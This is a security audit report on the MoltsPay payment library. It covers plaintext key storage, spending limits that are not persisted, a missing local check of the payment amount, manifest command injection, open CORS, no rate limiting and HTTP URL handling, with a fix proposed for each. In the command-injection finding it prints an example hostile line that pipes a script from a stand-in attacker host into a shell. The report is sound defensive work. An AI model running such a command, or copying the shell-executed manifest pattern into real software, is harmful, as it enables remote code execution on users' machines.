# MoltsPay Security Analysis

**Version:** 0.8.11  
**Date:** 2026-02-19  
**Analyst:** Zen7  

---

## Summary

| Severity | Count | Status |
|----------|-------|--------|
| 🔴 HIGH | 1 | Needs fix before v1.0 |
| 🟠 MEDIUM | 3 | Should fix |
| 🟡 LOW | 3 | Nice to have |
| ✅ GOOD | 3 | No issues |

---

## 🔴 HIGH Severity Issues

### 1. Private Key Stored in Plaintext (Client)

**Location:** `src/client/index.ts` - `MoltsPayClient.init()`

**Problem:**
```typescript
// Current implementation stores private key in plaintext
const walletData: WalletData = {
  address: wallet.address,
  privateKey: wallet.privateKey,  // ← PLAINTEXT!
  createdAt: Date.now(),
};
writeFileSync(walletPath, JSON.stringify(walletData, null, 2));
// No file permissions set!
```

**Risk:**
- Anyone with file system access can steal the private key
- If server is compromised, all agent wallets are exposed
- No protection against malware scanning for crypto keys

**Impact:** Complete loss of funds in wallet

**Recommendation:**
```typescript
// Option 1: Require password encryption (like createWallet.ts supports)
const { encrypted, iv, salt } = encryptPrivateKey(wallet.privateKey, password);

// Option 2: Use OS keychain (macOS Keychain, Windows Credential Manager, Linux Secret Service)
import keytar from 'keytar';
await keytar.setPassword('moltspay', wallet.address, wallet.privateKey);

// Option 3: At minimum, set file permissions
writeFileSync(walletPath, JSON.stringify(walletData, null, 2), { mode: 0o600 });
```

**Priority:** Must fix before v1.0

---

## 🟠 MEDIUM Severity Issues

### 2. Daily Spending Limit Not Persisted (Client)

**Location:** `src/client/index.ts` - `checkLimits()`, `recordSpending()`

**Problem:**
```typescript
private todaySpending: number = 0;       // ← In memory only!
private lastSpendingReset: number = 0;   // ← Lost on restart!
```

**Risk:**
- Restarting the client resets daily spending to 0
- Malicious code could restart client to bypass limits
- Legitimate restarts could allow overspending

**Impact:** Daily limit protection can be bypassed

**Recommendation:**
```typescript
// Persist spending to config file
private loadSpending(): void {
  const spendingPath = join(this.configDir, 'spending.json');
  if (existsSync(spendingPath)) {
    const data = JSON.parse(readFileSync(spendingPath, 'utf-8'));
    if (data.date === this.getTodayString()) {
      this.todaySpending = data.amount;
    }
  }
}

private saveSpending(): void {
  const spendingPath = join(this.configDir, 'spending.json');
  writeFileSync(spendingPath, JSON.stringify({
    date: this.getTodayString(),
    amount: this.todaySpending
  }));
}
```

---

### 3. Server Doesn't Verify Payment Amount Locally (Server)

**Location:** `src/server/index.ts` - `validatePayment()`

**Problem:**
```typescript
private validatePayment(payment, config): { valid: boolean; error?: string } {
  // Only checks version, scheme, network
  // Does NOT verify: payment.accepted.amount === config.price * 1e6
}
```

**Risk:**
- Relies entirely on facilitator for amount verification
- If facilitator has a bug, underpayment could slip through
- Defense in depth principle violated

**Recommendation:**
```typescript
private validatePayment(payment, config): { valid: boolean; error?: string } {
  // ... existing checks ...
  
  // Add amount verification
  const expectedAmount = Math.floor(config.price * 1e6).toString();
  const paymentAmount = payment.accepted?.amount;
  
  if (paymentAmount !== expectedAmount) {
    return { 
      valid: false, 
      error: `Amount mismatch: expected ${expectedAmount}, got ${paymentAmount}` 
    };
  }
  
  return { valid: true };
}
```

---

### 4. Command Injection Risk in CLI Server (CLI)

**Location:** `src/cli/index.ts` - `start` command

**Problem:**
```typescript
// User-defined command from manifest is executed via shell
spawn('sh', ['-c', service.command], { ... });
```

**Risk:**
- If manifest file is from untrusted source, arbitrary code execution
- Example malicious manifest:
  ```json
  { "command": "curl evil.com/steal.sh | sh" }
  ```

**Impact:** Full system compromise

**Mitigations:**
1. Document that manifest must be from trusted source
2. Add manifest signature verification (optional)
3. Use execFile with args array instead of shell:
   ```typescript
   // Safer: parse command into args
   const [cmd, ...args] = service.command.split(' ');
   spawn(cmd, args, { ... });
   ```

---

## 🟡 LOW Severity Issues

### 5. CORS Allows All Origins (Server)

**Location:** `src/server/index.ts` - `handleRequest()`

**Problem:**
```typescript
res.setHeader('Access-Control-Allow-Origin', '*');
```

**Risk:**
- Any website can call the API
- Potential CSRF-like attacks (though limited since it's payment API)

**Recommendation:**
- Document this is intentional for x402 protocol
- Add option to configure allowed origins:
  ```typescript
  options: {
    cors: {
      origin: '*',  // or ['https://trusted.com']
    }
  }
  ```

---

### 6. No Rate Limiting (Server)

**Location:** `src/server/index.ts`

**Problem:**
- No built-in rate limiting
- Could be DoS'd with repeated requests

**Recommendation:**
- Add simple rate limiting:
  ```typescript
  import rateLimit from 'express-rate-limit';
  // or implement simple in-memory rate limit
  ```
- Document that nginx/reverse proxy should handle this in production

---

### 7. HTTP URLs Not Warned (Client)

**Location:** `src/client/index.ts` - `pay()`

**Problem:**
- Client accepts HTTP URLs without warning
- MITM attack could intercept payment requirements

**Recommendation:**
```typescript
if (serverUrl.startsWith('http://') && !serverUrl.includes('localhost')) {
  console.warn('[MoltsPay] WARNING: Using HTTP is insecure. Use HTTPS in production.');
}
```

---

## ✅ Good Security Practices

### Replay Attack Protection
- ✅ EIP-3009 uses unique nonce per authorization
- ✅ `validBefore` timestamp provides expiration (1 hour)
- ✅ Facilitator tracks used nonces

### Amount Tampering Protection
- ✅ Amount is part of EIP-712 signed payload
- ✅ Cannot modify amount without invalidating signature

### Pay-for-Success Model
- ✅ Service executes before settlement
- ✅ If service fails, payment is not settled
- ✅ Client only charged on success

---

## Recommendations Summary

### Before v1.0 Release (Must Have)
1. [ ] Encrypt private keys at rest (or use keychain)
2. [ ] Set file permissions on wallet.json (0o600)
3. [ ] Persist daily spending limits to disk

### Before Production Use (Should Have)
4. [ ] Add local amount verification on server
5. [ ] Document command injection risk in manifest
6. [ ] Add HTTP URL warning

### Nice to Have
7. [ ] Configurable CORS
8. [ ] Built-in rate limiting
9. [ ] Manifest signature verification

---

## File Permissions Audit

| File | Current | Should Be |
|------|---------|-----------|
| `~/.moltspay/wallet.json` | 0o644 | 0o600 |
| `~/.moltspay/config.json` | 0o644 | 0o644 (ok) |
| `~/.moltspay/.env` | 0o600 | 0o600 (ok) ✅ |

---

*Report generated: 2026-02-19*
